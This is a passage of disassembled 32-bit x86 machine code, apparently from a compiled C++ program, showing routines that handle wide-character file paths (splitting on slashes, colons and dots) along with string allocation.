  401c19:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  401c1c:	83 fa 08             	cmp    $0x8,%edx
  401c1f:	72 05                	jb     0x401c26
  401c21:	8b 07                	mov    (%edi),%eax
  401c23:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401c26:	8b d3                	mov    %ebx,%edx
  401c28:	e8 83 fd ff ff       	call   0x4019b0
  401c2d:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  401c30:	8b d8                	mov    %eax,%ebx
  401c32:	8b 55 ec             	mov    -0x14(%ebp),%edx
  401c35:	8d 14 0a             	lea    (%edx,%ecx,1),%edx
  401c38:	e8 73 fd ff ff       	call   0x4019b0
  401c3d:	8b d0                	mov    %eax,%edx
  401c3f:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401c42:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  401c45:	3b c2                	cmp    %edx,%eax
  401c47:	74 79                	je     0x401cc2
  401c49:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401c4c:	52                   	push   %edx
  401c4d:	50                   	push   %eax
  401c4e:	8b d3                	mov    %ebx,%edx
  401c50:	e8 8b fe ff ff       	call   0x401ae0
  401c55:	83 c4 08             	add    $0x8,%esp
  401c58:	85 c0                	test   %eax,%eax
  401c5a:	74 60                	je     0x401cbc
  401c5c:	3b f7                	cmp    %edi,%esi
  401c5e:	0f 84 41 01 00 00    	je     0x401da5
  401c64:	83 7f 14 08          	cmpl   $0x8,0x14(%edi)
  401c68:	72 02                	jb     0x401c6c
  401c6a:	8b 3f                	mov    (%edi),%edi
  401c6c:	ff 75 e0             	push   -0x20(%ebp)
  401c6f:	8b ce                	mov    %esi,%ecx
  401c71:	57                   	push   %edi
  401c72:	e8 29 2a 00 00       	call   0x4046a0
  401c77:	5f                   	pop    %edi
  401c78:	8b c6                	mov    %esi,%eax
  401c7a:	5e                   	pop    %esi
  401c7b:	5b                   	pop    %ebx
  401c7c:	8b e5                	mov    %ebp,%esp
  401c7e:	5d                   	pop    %ebp
  401c7f:	c2 04 00             	ret    $0x4
  401c82:	8b 55 f0             	mov    -0x10(%ebp),%edx
  401c85:	8b cb                	mov    %ebx,%ecx
  401c87:	e8 24 fd ff ff       	call   0x4019b0
  401c8c:	8b 57 14             	mov    0x14(%edi),%edx
  401c8f:	3b d8                	cmp    %eax,%ebx
  401c91:	0f 84 5f ff ff ff    	je     0x401bf6
  401c97:	3b f7                	cmp    %edi,%esi
  401c99:	0f 84 06 01 00 00    	je     0x401da5
  401c9f:	83 fa 08             	cmp    $0x8,%edx
  401ca2:	72 02                	jb     0x401ca6
  401ca4:	8b 3f                	mov    (%edi),%edi
  401ca6:	ff 75 e0             	push   -0x20(%ebp)
  401ca9:	8b ce                	mov    %esi,%ecx
  401cab:	57                   	push   %edi
  401cac:	e8 ef 29 00 00       	call   0x4046a0
  401cb1:	5f                   	pop    %edi
  401cb2:	8b c6                	mov    %esi,%eax
  401cb4:	5e                   	pop    %esi
  401cb5:	5b                   	pop    %ebx
  401cb6:	8b e5                	mov    %ebp,%esp
  401cb8:	5d                   	pop    %ebp
  401cb9:	c2 04 00             	ret    $0x4
  401cbc:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  401cbf:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401cc2:	8b 7d ec             	mov    -0x14(%ebp),%edi
  401cc5:	03 f8                	add    %eax,%edi
  401cc7:	3b d7                	cmp    %edi,%edx
  401cc9:	74 30                	je     0x401cfb
  401ccb:	0f b7 02             	movzwl (%edx),%eax
  401cce:	83 f8 5c             	cmp    $0x5c,%eax
  401cd1:	74 05                	je     0x401cd8
  401cd3:	83 f8 2f             	cmp    $0x2f,%eax
  401cd6:	75 23                	jne    0x401cfb
  401cd8:	2b 5d f4             	sub    -0xc(%ebp),%ebx
  401cdb:	d1 fb                	sar    $1,%ebx
  401cdd:	39 5e 10             	cmp    %ebx,0x10(%esi)
  401ce0:	0f 82 ca 00 00 00    	jb     0x401db0
  401ce6:	83 7d e8 08          	cmpl   $0x8,-0x18(%ebp)
  401cea:	8b c6                	mov    %esi,%eax
  401cec:	72 02                	jb     0x401cf0
  401cee:	8b 06                	mov    (%esi),%eax
  401cf0:	33 c9                	xor    %ecx,%ecx
  401cf2:	89 5e 10             	mov    %ebx,0x10(%esi)
  401cf5:	66 89 0c 58          	mov    %cx,(%eax,%ebx,2)
  401cf9:	eb 55                	jmp    0x401d50
  401cfb:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401cfe:	3b d8                	cmp    %eax,%ebx
  401d00:	75 0d                	jne    0x401d0f
  401d02:	2b 5d f4             	sub    -0xc(%ebp),%ebx
  401d05:	83 e3 fe             	and    $0xfffffffe,%ebx
  401d08:	83 fb 06             	cmp    $0x6,%ebx
  401d0b:	7c 43                	jl     0x401d50
  401d0d:	eb 0e                	jmp    0x401d1d
  401d0f:	0f b7 40 fe          	movzwl -0x2(%eax),%eax
  401d13:	83 f8 5c             	cmp    $0x5c,%eax
  401d16:	74 38                	je     0x401d50
  401d18:	83 f8 2f             	cmp    $0x2f,%eax
  401d1b:	74 33                	je     0x401d50
  401d1d:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  401d20:	8b 46 10             	mov    0x10(%esi),%eax
  401d23:	3b c1                	cmp    %ecx,%eax
  401d25:	73 19                	jae    0x401d40
  401d27:	40                   	inc    %eax
  401d28:	89 46 10             	mov    %eax,0x10(%esi)
  401d2b:	8b c6                	mov    %esi,%eax
  401d2d:	83 f9 08             	cmp    $0x8,%ecx
  401d30:	72 02                	jb     0x401d34
  401d32:	8b 06                	mov    (%esi),%eax
  401d34:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  401d37:	c7 04 01 5c 00 00 00 	movl   $0x5c,(%ecx,%eax,1)
  401d3e:	eb 10                	jmp    0x401d50
  401d40:	6a 5c                	push   $0x5c
  401d42:	ff 75 fc             	push   -0x4(%ebp)
  401d45:	51                   	push   %ecx
  401d46:	8b ce                	mov    %esi,%ecx
  401d48:	e8 b3 34 00 00       	call   0x405200
  401d4d:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  401d50:	8b 46 14             	mov    0x14(%esi),%eax
  401d53:	2b fa                	sub    %edx,%edi
  401d55:	8b 4e 10             	mov    0x10(%esi),%ecx
  401d58:	2b c1                	sub    %ecx,%eax
  401d5a:	d1 ff                	sar    $1,%edi
  401d5c:	3b f8                	cmp    %eax,%edi
  401d5e:	77 38                	ja     0x401d98
  401d60:	83 7e 14 08          	cmpl   $0x8,0x14(%esi)
  401d64:	8d 04 39             	lea    (%ecx,%edi,1),%eax
  401d67:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401d6a:	8b de                	mov    %esi,%ebx
  401d6c:	89 46 10             	mov    %eax,0x10(%esi)
  401d6f:	72 02                	jb     0x401d73
  401d71:	8b 1e                	mov    (%esi),%ebx
  401d73:	8d 04 3f             	lea    (%edi,%edi,1),%eax
  401d76:	50                   	push   %eax
  401d77:	8d 0c 4b             	lea    (%ebx,%ecx,2),%ecx
  401d7a:	52                   	push   %edx
  401d7b:	51                   	push   %ecx
  401d7c:	e8 46 5c 00 00       	call   0x4079c7
  401d81:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401d84:	83 c4 0c             	add    $0xc,%esp
  401d87:	33 c9                	xor    %ecx,%ecx
  401d89:	66 89 0c 43          	mov    %cx,(%ebx,%eax,2)
  401d8d:	8b c6                	mov    %esi,%eax
  401d8f:	5f                   	pop    %edi
  401d90:	5e                   	pop    %esi
  401d91:	5b                   	pop    %ebx
  401d92:	8b e5                	mov    %ebp,%esp
  401d94:	5d                   	pop    %ebp
  401d95:	c2 04 00             	ret    $0x4
  401d98:	57                   	push   %edi
  401d99:	52                   	push   %edx
  401d9a:	ff 75 fc             	push   -0x4(%ebp)
  401d9d:	8b ce                	mov    %esi,%ecx
  401d9f:	57                   	push   %edi
  401da0:	e8 bb 35 00 00       	call   0x405360
  401da5:	5f                   	pop    %edi
  401da6:	8b c6                	mov    %esi,%eax
  401da8:	5e                   	pop    %esi
  401da9:	5b                   	pop    %ebx
  401daa:	8b e5                	mov    %ebp,%esp
  401dac:	5d                   	pop    %ebp
  401dad:	c2 04 00             	ret    $0x4
  401db0:	e8 db 2b 00 00       	call   0x404990
  401db5:	cc                   	int3
  401db6:	cc                   	int3
  401db7:	cc                   	int3
  401db8:	cc                   	int3
  401db9:	cc                   	int3
  401dba:	cc                   	int3
  401dbb:	cc                   	int3
  401dbc:	cc                   	int3
  401dbd:	cc                   	int3
  401dbe:	cc                   	int3
  401dbf:	cc                   	int3
  401dc0:	55                   	push   %ebp
  401dc1:	8b ec                	mov    %esp,%ebp
  401dc3:	83 ec 10             	sub    $0x10,%esp
  401dc6:	83 79 14 08          	cmpl   $0x8,0x14(%ecx)
  401dca:	53                   	push   %ebx
  401dcb:	56                   	push   %esi
  401dcc:	57                   	push   %edi
  401dcd:	8b d9                	mov    %ecx,%ebx
  401dcf:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  401dd2:	72 05                	jb     0x401dd9
  401dd4:	8b 19                	mov    (%ecx),%ebx
  401dd6:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  401dd9:	8b 41 10             	mov    0x10(%ecx),%eax
  401ddc:	8b cb                	mov    %ebx,%ecx
  401dde:	8d 3c 43             	lea    (%ebx,%eax,2),%edi
  401de1:	8b d7                	mov    %edi,%edx
  401de3:	e8 c8 fb ff ff       	call   0x4019b0
  401de8:	8b 75 08             	mov    0x8(%ebp),%esi
  401deb:	8b ce                	mov    %esi,%ecx
  401ded:	8b 55 0c             	mov    0xc(%ebp),%edx
  401df0:	89 45 f0             	mov    %eax,-0x10(%ebp)
  401df3:	8d 1c 56             	lea    (%esi,%edx,2),%ebx
  401df6:	8b d3                	mov    %ebx,%edx
  401df8:	e8 b3 fb ff ff       	call   0x4019b0
  401dfd:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  401e00:	50                   	push   %eax
  401e01:	56                   	push   %esi
  401e02:	8b 75 f0             	mov    -0x10(%ebp),%esi
  401e05:	8b d6                	mov    %esi,%edx
  401e07:	89 45 f4             	mov    %eax,-0xc(%ebp)
  401e0a:	e8 d1 fc ff ff       	call   0x401ae0
  401e0f:	83 c4 08             	add    $0x8,%esp
  401e12:	85 c0                	test   %eax,%eax
  401e14:	0f 85 16 01 00 00    	jne    0x401f30
  401e1a:	8b ce                	mov    %esi,%ecx
  401e1c:	3b f7                	cmp    %edi,%esi
  401e1e:	74 14                	je     0x401e34
  401e20:	0f b7 01             	movzwl (%ecx),%eax
  401e23:	83 f8 5c             	cmp    $0x5c,%eax
  401e26:	74 05                	je     0x401e2d
  401e28:	83 f8 2f             	cmp    $0x2f,%eax
  401e2b:	75 07                	jne    0x401e34
  401e2d:	83 c1 02             	add    $0x2,%ecx
  401e30:	3b cf                	cmp    %edi,%ecx
  401e32:	75 ec                	jne    0x401e20
  401e34:	8b 45 f4             	mov    -0xc(%ebp),%eax
  401e37:	8b f0                	mov    %eax,%esi
  401e39:	3b c3                	cmp    %ebx,%eax
  401e3b:	74 1a                	je     0x401e57
  401e3d:	0f 1f 00             	nopl   (%eax)
  401e40:	0f b7 06             	movzwl (%esi),%eax
  401e43:	83 f8 5c             	cmp    $0x5c,%eax
  401e46:	74 05                	je     0x401e4d
  401e48:	83 f8 2f             	cmp    $0x2f,%eax
  401e4b:	75 07                	jne    0x401e54
  401e4d:	83 c6 02             	add    $0x2,%esi
  401e50:	3b f3                	cmp    %ebx,%esi
  401e52:	75 ec                	jne    0x401e40
  401e54:	8b 45 f4             	mov    -0xc(%ebp),%eax
  401e57:	33 d2                	xor    %edx,%edx
  401e59:	3b c6                	cmp    %esi,%eax
  401e5b:	0f 95 c2             	setne  %dl
  401e5e:	33 c0                	xor    %eax,%eax
  401e60:	39 4d f0             	cmp    %ecx,-0x10(%ebp)
  401e63:	0f 95 c0             	setne  %al
  401e66:	2b c2                	sub    %edx,%eax
  401e68:	0f 85 c2 00 00 00    	jne    0x401f30
  401e6e:	33 d2                	xor    %edx,%edx
  401e70:	3b f3                	cmp    %ebx,%esi
  401e72:	0f 94 c2             	sete   %dl
  401e75:	3b cf                	cmp    %edi,%ecx
  401e77:	0f 94 c0             	sete   %al
  401e7a:	2b d0                	sub    %eax,%edx
  401e7c:	3b cf                	cmp    %edi,%ecx
  401e7e:	0f 84 aa 00 00 00    	je     0x401f2e
  401e84:	85 d2                	test   %edx,%edx
  401e86:	0f 85 a2 00 00 00    	jne    0x401f2e
  401e8c:	0f b7 01             	movzwl (%ecx),%eax
  401e8f:	83 f8 5c             	cmp    $0x5c,%eax
  401e92:	74 09                	je     0x401e9d
  401e94:	83 f8 2f             	cmp    $0x2f,%eax
  401e97:	74 04                	je     0x401e9d
  401e99:	32 c0                	xor    %al,%al
  401e9b:	eb 02                	jmp    0x401e9f
  401e9d:	b0 01                	mov    $0x1,%al
  401e9f:	0f b7 16             	movzwl (%esi),%edx
  401ea2:	88 45 ff             	mov    %al,-0x1(%ebp)
  401ea5:	83 fa 5c             	cmp    $0x5c,%edx
  401ea8:	74 09                	je     0x401eb3
  401eaa:	83 fa 2f             	cmp    $0x2f,%edx
  401ead:	74 04                	je     0x401eb3
  401eaf:	33 d2                	xor    %edx,%edx
  401eb1:	eb 05                	jmp    0x401eb8
  401eb3:	ba 01 00 00 00       	mov    $0x1,%edx
  401eb8:	0f b6 c0             	movzbl %al,%eax
  401ebb:	2b d0                	sub    %eax,%edx
  401ebd:	75 6f                	jne    0x401f2e
  401ebf:	38 55 ff             	cmp    %dl,-0x1(%ebp)
  401ec2:	74 42                	je     0x401f06
  401ec4:	83 c1 02             	add    $0x2,%ecx
  401ec7:	3b cf                	cmp    %edi,%ecx
  401ec9:	74 19                	je     0x401ee4
  401ecb:	0f 1f 44 00 00       	nopl   0x0(%eax,%eax,1)
  401ed0:	0f b7 01             	movzwl (%ecx),%eax
  401ed3:	83 f8 5c             	cmp    $0x5c,%eax
  401ed6:	74 05                	je     0x401edd
  401ed8:	83 f8 2f             	cmp    $0x2f,%eax
  401edb:	75 07                	jne    0x401ee4
  401edd:	83 c1 02             	add    $0x2,%ecx
  401ee0:	3b cf                	cmp    %edi,%ecx
  401ee2:	75 ec                	jne    0x401ed0
  401ee4:	83 c6 02             	add    $0x2,%esi
  401ee7:	3b f3                	cmp    %ebx,%esi
  401ee9:	74 2b                	je     0x401f16
  401eeb:	0f 1f 44 00 00       	nopl   0x0(%eax,%eax,1)
  401ef0:	0f b7 06             	movzwl (%esi),%eax
  401ef3:	83 f8 5c             	cmp    $0x5c,%eax
  401ef6:	74 05                	je     0x401efd
  401ef8:	83 f8 2f             	cmp    $0x2f,%eax
  401efb:	75 19                	jne    0x401f16
  401efd:	83 c6 02             	add    $0x2,%esi
  401f00:	3b f3                	cmp    %ebx,%esi
  401f02:	75 ec                	jne    0x401ef0
  401f04:	eb 10                	jmp    0x401f16
  401f06:	0f b7 06             	movzwl (%esi),%eax
  401f09:	0f b7 11             	movzwl (%ecx),%edx
  401f0c:	2b d0                	sub    %eax,%edx
  401f0e:	75 1e                	jne    0x401f2e
  401f10:	83 c1 02             	add    $0x2,%ecx
  401f13:	83 c6 02             	add    $0x2,%esi
  401f16:	33 d2                	xor    %edx,%edx
  401f18:	3b f3                	cmp    %ebx,%esi
  401f1a:	0f 94 c2             	sete   %dl
  401f1d:	33 c0                	xor    %eax,%eax
  401f1f:	3b cf                	cmp    %edi,%ecx
  401f21:	0f 94 c0             	sete   %al
  401f24:	2b d0                	sub    %eax,%edx
  401f26:	3b cf                	cmp    %edi,%ecx
  401f28:	0f 85 56 ff ff ff    	jne    0x401e84
  401f2e:	8b c2                	mov    %edx,%eax
  401f30:	5f                   	pop    %edi
  401f31:	5e                   	pop    %esi
  401f32:	5b                   	pop    %ebx
  401f33:	8b e5                	mov    %ebp,%esp
  401f35:	5d                   	pop    %ebp
  401f36:	c2 08 00             	ret    $0x8
  401f39:	cc                   	int3
  401f3a:	cc                   	int3
  401f3b:	cc                   	int3
  401f3c:	cc                   	int3
  401f3d:	cc                   	int3
  401f3e:	cc                   	int3
  401f3f:	cc                   	int3
  401f40:	55                   	push   %ebp
  401f41:	8b ec                	mov    %esp,%ebp
  401f43:	83 e4 f8             	and    $0xfffffff8,%esp
  401f46:	83 ec 14             	sub    $0x14,%esp
  401f49:	a1 04 c0 40 00       	mov    0x40c004,%eax
  401f4e:	33 c4                	xor    %esp,%eax
  401f50:	89 44 24 10          	mov    %eax,0x10(%esp)
  401f54:	83 79 14 08          	cmpl   $0x8,0x14(%ecx)
  401f58:	53                   	push   %ebx
  401f59:	8b 5d 08             	mov    0x8(%ebp),%ebx
  401f5c:	56                   	push   %esi
  401f5d:	57                   	push   %edi
  401f5e:	89 5c 24 0c          	mov    %ebx,0xc(%esp)
  401f62:	8b f9                	mov    %ecx,%edi
  401f64:	72 02                	jb     0x401f68
  401f66:	8b 39                	mov    (%ecx),%edi
  401f68:	8b 41 10             	mov    0x10(%ecx),%eax
  401f6b:	8b cf                	mov    %edi,%ecx
  401f6d:	8d 34 47             	lea    (%edi,%eax,2),%esi
  401f70:	8b d6                	mov    %esi,%edx
  401f72:	e8 19 fb ff ff       	call   0x401a90
  401f77:	8b d0                	mov    %eax,%edx
  401f79:	8b ca                	mov    %edx,%ecx
  401f7b:	3b d6                	cmp    %esi,%edx
  401f7d:	74 41                	je     0x401fc0
  401f7f:	90                   	nop
  401f80:	66 83 39 3a          	cmpw   $0x3a,(%ecx)
  401f84:	74 07                	je     0x401f8d
  401f86:	83 c1 02             	add    $0x2,%ecx
  401f89:	3b ce                	cmp    %esi,%ecx
  401f8b:	75 f3                	jne    0x401f80
  401f8d:	3b d1                	cmp    %ecx,%edx
  401f8f:	74 2f                	je     0x401fc0
  401f91:	8d 41 fe             	lea    -0x2(%ecx),%eax
  401f94:	3b d0                	cmp    %eax,%edx
  401f96:	74 28                	je     0x401fc0
  401f98:	66 83 38 2e          	cmpw   $0x2e,(%eax)
  401f9c:	8d 70 fe             	lea    -0x2(%eax),%esi
  401f9f:	75 0c                	jne    0x401fad
  401fa1:	3b d6                	cmp    %esi,%edx
  401fa3:	75 1d                	jne    0x401fc2
  401fa5:	66 83 3e 2e          	cmpw   $0x2e,(%esi)
  401fa9:	75 17                	jne    0x401fc2
  401fab:	eb 13                	jmp    0x401fc0
  401fad:	8b c6                	mov    %esi,%eax
  401faf:	3b d0                	cmp    %eax,%edx
  401fb1:	74 0d                	je     0x401fc0
  401fb3:	66 83 38 2e          	cmpw   $0x2e,(%eax)
  401fb7:	74 09                	je     0x401fc2
  401fb9:	83 e8 02             	sub    $0x2,%eax
  401fbc:	3b d0                	cmp    %eax,%edx
  401fbe:	75 f3                	jne    0x401fb3
  401fc0:	8b c1                	mov    %ecx,%eax
  401fc2:	2b c8                	sub    %eax,%ecx
  401fc4:	c6 44 24 0c 00       	movb   $0x0,0xc(%esp)
  401fc9:	ff 74 24 0c          	push   0xc(%esp)
  401fcd:	d1 f9                	sar    $1,%ecx
  401fcf:	8d 54 24 14          	lea    0x14(%esp),%edx
  401fd3:	89 4c 24 18          	mov    %ecx,0x18(%esp)
  401fd7:	8b cb                	mov    %ebx,%ecx
  401fd9:	89 44 24 14          	mov    %eax,0x14(%esp)
  401fdd:	e8 8e 3f 00 00       	call   0x405f70
  401fe2:	8b 4c 24 20          	mov    0x20(%esp),%ecx
  401fe6:	83 c4 04             	add    $0x4,%esp
  401fe9:	8b c3                	mov    %ebx,%eax
  401feb:	5f                   	pop    %edi
  401fec:	5e                   	pop    %esi
  401fed:	5b                   	pop    %ebx
  401fee:	33 cc                	xor    %esp,%ecx
  401ff0:	e8 84 4a 00 00       	call   0x406a79
  401ff5:	8b e5                	mov    %ebp,%esp
  401ff7:	5d                   	pop    %ebp
  401ff8:	c2 04 00             	ret    $0x4
  401ffb:	cc                   	int3
  401ffc:	cc                   	int3
  401ffd:	cc                   	int3
  401ffe:	cc                   	int3
  401fff:	cc                   	int3
  402000:	56                   	push   %esi
  402001:	8b f1                	mov    %ecx,%esi
  402003:	8b 4e 14             	mov    0x14(%esi),%ecx
  402006:	83 f9 08             	cmp    $0x8,%ecx
  402009:	72 2d                	jb     0x402038
  40200b:	8b 06                	mov    (%esi),%eax
  40200d:	8d 0c 4d 02 00 00 00 	lea    0x2(,%ecx,2),%ecx
  402014:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  40201a:	72 12                	jb     0x40202e
  40201c:	8b 50 fc             	mov    -0x4(%eax),%edx
  40201f:	83 c1 23             	add    $0x23,%ecx
  402022:	2b c2                	sub    %edx,%eax
  402024:	83 c0 fc             	add    $0xfffffffc,%eax
  402027:	83 f8 1f             	cmp    $0x1f,%eax
  40202a:	77 21                	ja     0x40204d
  40202c:	8b c2                	mov    %edx,%eax
  40202e:	51                   	push   %ecx
  40202f:	50                   	push   %eax
  402030:	e8 87 4a 00 00       	call   0x406abc
  402035:	83 c4 08             	add    $0x8,%esp
  402038:	33 c0                	xor    %eax,%eax
  40203a:	c7 46 10 00 00 00 00 	movl   $0x0,0x10(%esi)
  402041:	c7 46 14 07 00 00 00 	movl   $0x7,0x14(%esi)
  402048:	66 89 06             	mov    %ax,(%esi)
  40204b:	5e                   	pop    %esi
  40204c:	c3                   	ret
  40204d:	ff 15 80 91 40 00    	call   *0x409180
  402053:	cc                   	int3
  402054:	cc                   	int3
  402055:	cc                   	int3
  402056:	cc                   	int3
  402057:	cc                   	int3
  402058:	cc                   	int3
  402059:	cc                   	int3
  40205a:	cc                   	int3
  40205b:	cc                   	int3
  40205c:	cc                   	int3
  40205d:	cc                   	int3
  40205e:	cc                   	int3
  40205f:	cc                   	int3
  402060:	55                   	push   %ebp
  402061:	8b ec                	mov    %esp,%ebp
  402063:	51                   	push   %ecx
  402064:	53                   	push   %ebx
  402065:	8b 5d 08             	mov    0x8(%ebp),%ebx
  402068:	56                   	push   %esi
  402069:	8b f1                	mov    %ecx,%esi
  40206b:	89 75 fc             	mov    %esi,-0x4(%ebp)
  40206e:	89 75 fc             	mov    %esi,-0x4(%ebp)
  402071:	57                   	push   %edi
  402072:	c7 06 00 00 00 00    	movl   $0x0,(%esi)
  402078:	c7 46 10 00 00 00 00 	movl   $0x0,0x10(%esi)
  40207f:	c7 46 14 00 00 00 00 	movl   $0x0,0x14(%esi)
  402086:	83 7b 14 08          	cmpl   $0x8,0x14(%ebx)
  40208a:	8b 43 10             	mov    0x10(%ebx),%eax
  40208d:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402090:	72 02                	jb     0x402094
  402092:	8b 1b                	mov    (%ebx),%ebx
  402094:	83 f8 08             	cmp    $0x8,%eax
  402097:	73 1c                	jae    0x4020b5
  402099:	0f 10 03             	movups (%ebx),%xmm0
  40209c:	bf 07 00 00 00       	mov    $0x7,%edi
  4020a1:	0f 11 06             	movups %xmm0,(%esi)
  4020a4:	89 46 10             	mov    %eax,0x10(%esi)
  4020a7:	8b c6                	mov    %esi,%eax
  4020a9:	89 7e 14             	mov    %edi,0x14(%esi)
  4020ac:	5f                   	pop    %edi
  4020ad:	5e                   	pop    %esi
  4020ae:	5b                   	pop    %ebx
  4020af:	8b e5                	mov    %ebp,%esp
  4020b1:	5d                   	pop    %ebp
  4020b2:	c2 04 00             	ret    $0x4
  4020b5:	8b f8                	mov    %eax,%edi
  4020b7:	b8 fe ff ff 7f       	mov    $0x7ffffffe,%eax
  4020bc:	83 cf 07             	or     $0x7,%edi
  4020bf:	3b f8                	cmp    %eax,%edi
  4020c1:	0f 47 f8             	cmova  %eax,%edi
  4020c4:	8d 47 01             	lea    0x1(%edi),%eax
  4020c7:	3d ff ff ff 7f       	cmp    $0x7fffffff,%eax
  4020cc:	77 6c                	ja     0x40213a
  4020ce:	03 c0                	add    %eax,%eax
  4020d0:	3d 00 10 00 00       	cmp    $0x1000,%eax
  4020d5:	72 25                	jb     0x4020fc
  4020d7:	8d 48 23             	lea    0x23(%eax),%ecx
  4020da:	3b c8                	cmp    %eax,%ecx
  4020dc:	76 5c                	jbe    0x40213a
  4020de:	51                   	push   %ecx
  4020df:	e8 a3 49 00 00       	call   0x406a87
  4020e4:	83 c4 04             	add    $0x4,%esp
  4020e7:	85 c0                	test   %eax,%eax
  4020e9:	74 0b                	je     0x4020f6
  4020eb:	8d 48 23             	lea    0x23(%eax),%ecx
  4020ee:	83 e1 e0             	and    $0xffffffe0,%ecx
  4020f1:	89 41 fc             	mov    %eax,-0x4(%ecx)
  4020f4:	eb 19                	jmp    0x40210f
  4020f6:	ff 15 80 91 40 00    	call   *0x409180
  4020fc:	85 c0                	test   %eax,%eax
  4020fe:	74 0d                	je     0x40210d
  402100:	50                   	push   %eax
  402101:	e8 81 49 00 00       	call   0x406a87
  402106:	83 c4 04             	add    $0x4,%esp
  402109:	8b c8                	mov    %eax,%ecx
  40210b:	eb 02                	jmp    0x40210f
  40210d:	33 c9                	xor    %ecx,%ecx
  40210f:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402112:	89 0e                	mov    %ecx,(%esi)
  402114:	8d 04 45 02 00 00 00 	lea    0x2(,%eax,2),%eax
  40211b:	50                   	push   %eax
  40211c:	53                   	push   %ebx
  40211d:	51                   	push   %ecx
  40211e:	e8 9e 58 00 00       	call   0x4079c1
  402123:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402126:	83 c4 0c             	add    $0xc,%esp
  402129:	89 46 10             	mov    %eax,0x10(%esi)
  40212c:	8b c6                	mov    %esi,%eax
  40212e:	89 7e 14             	mov    %edi,0x14(%esi)
  402131:	5f                   	pop    %edi
  402132:	5e                   	pop    %esi
  402133:	5b                   	pop    %ebx
  402134:	8b e5                	mov    %ebp,%esp
  402136:	5d                   	pop    %ebp
  402137:	c2 04 00             	ret    $0x4
  40213a:	e8 91 ef ff ff       	call   0x4010d0
  40213f:	cc                   	int3
  402140:	55                   	push   %ebp
  402141:	8b ec                	mov    %esp,%ebp
  402143:	6a ff                	push   $0xffffffff
  402145:	68 e3 7a 40 00       	push   $0x407ae3
  40214a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  402150:	50                   	push   %eax
  402151:	83 ec 08             	sub    $0x8,%esp
  402154:	53                   	push   %ebx
  402155:	56                   	push   %esi
  402156:	57                   	push   %edi
  402157:	a1 04 c0 40 00       	mov    0x40c004,%eax
  40215c:	33 c5                	xor    %ebp,%eax
  40215e:	50                   	push   %eax
  40215f:	8d 45 f4             	lea    -0xc(%ebp),%eax
  402162:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  402168:	8b f1                	mov    %ecx,%esi
  40216a:	89 75 f0             	mov    %esi,-0x10(%ebp)
  40216d:	8b 45 08             	mov    0x8(%ebp),%eax
  402170:	50                   	push   %eax
  402171:	89 75 ec             	mov    %esi,-0x14(%ebp)
  402174:	ff 75 10             	push   0x10(%ebp)
  402177:	ff 75 0c             	push   0xc(%ebp)
  40217a:	e8 01 f4 ff ff       	call   0x401580
  40217f:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  402186:	c7 06 1c 95 40 00    	movl   $0x40951c,(%esi)
  40218c:	c7 46 14 00 00 00 00 	movl   $0x0,0x14(%esi)
  402193:	33 c0                	xor    %eax,%eax
  402195:	c7 46 24 00 00 00 00 	movl   $0x0,0x24(%esi)
  40219c:	c7 46 28 07 00 00 00 	movl   $0x7,0x28(%esi)
  4021a3:	66 89 46 14          	mov    %ax,0x14(%esi)
  4021a7:	89 46 2c             	mov    %eax,0x2c(%esi)
  4021aa:	89 46 3c             	mov    %eax,0x3c(%esi)
  4021ad:	c7 46 40 07 00 00 00 	movl   $0x7,0x40(%esi)
  4021b4:	66 89 46 2c          	mov    %ax,0x2c(%esi)
  4021b8:	8b 46 04             	mov    0x4(%esi),%eax
  4021bb:	8d 4e 44             	lea    0x44(%esi),%ecx
  4021be:	85 c0                	test   %eax,%eax
  4021c0:	c7 01 00 00 00 00    	movl   $0x0,(%ecx)
  4021c6:	bf 94 93 40 00       	mov    $0x409394,%edi
  4021cb:	0f 45 f8             	cmovne %eax,%edi
  4021ce:	8b d7                	mov    %edi,%edx
  4021d0:	c7 41 10 00 00 00 00 	movl   $0x0,0x10(%ecx)
  4021d7:	c7 41 14 0f 00 00 00 	movl   $0xf,0x14(%ecx)
  4021de:	c6 01 00             	movb   $0x0,(%ecx)
  4021e1:	c6 45 fc 04          	movb   $0x4,-0x4(%ebp)
  4021e5:	8d 5a 01             	lea    0x1(%edx),%ebx
  4021e8:	8a 02                	mov    (%edx),%al
  4021ea:	42                   	inc    %edx
  4021eb:	84 c0                	test   %al,%al
  4021ed:	75 f9                	jne    0x4021e8
  4021ef:	2b d3                	sub    %ebx,%edx
  4021f1:	52                   	push   %edx
  4021f2:	57                   	push   %edi
  4021f3:	e8 08 26 00 00       	call   0x404800
  4021f8:	8b c6                	mov    %esi,%eax
  4021fa:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4021fd:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  402204:	59                   	pop    %ecx
  402205:	5f                   	pop    %edi
  402206:	5e                   	pop    %esi
  402207:	5b                   	pop    %ebx
  402208:	8b e5                	mov    %ebp,%esp
  40220a:	5d                   	pop    %ebp
  40220b:	c2 0c 00             	ret    $0xc
  40220e:	cc                   	int3
  40220f:	cc                   	int3
  402210:	53                   	push   %ebx
  402211:	8b dc                	mov    %esp,%ebx
  402213:	83 ec 08             	sub    $0x8,%esp
  402216:	83 e4 f8             	and    $0xfffffff8,%esp
  402219:	83 c4 04             	add    $0x4,%esp
  40221c:	55                   	push   %ebp
  40221d:	8b 6b 04             	mov    0x4(%ebx),%ebp
